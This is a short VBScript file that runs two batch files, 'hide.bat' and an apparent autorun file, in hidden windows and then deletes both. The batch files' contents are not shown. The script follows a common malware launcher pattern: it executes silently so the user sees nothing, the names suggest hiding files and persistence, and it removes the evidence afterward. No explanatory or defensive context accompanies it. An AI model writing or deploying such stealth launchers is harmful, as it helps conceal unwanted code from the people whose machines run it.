Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "hide.bat" & Chr(34), 0
WshShell.Run chr(34) & "authorun.bat" & Chr(34), 0
Set WshShell = Nothing

Set filesys = CreateObject("Scripting.FileSystemObject")
filesys.DeleteFile "hide.bat"
filesys.DeleteFile "authorun.bat"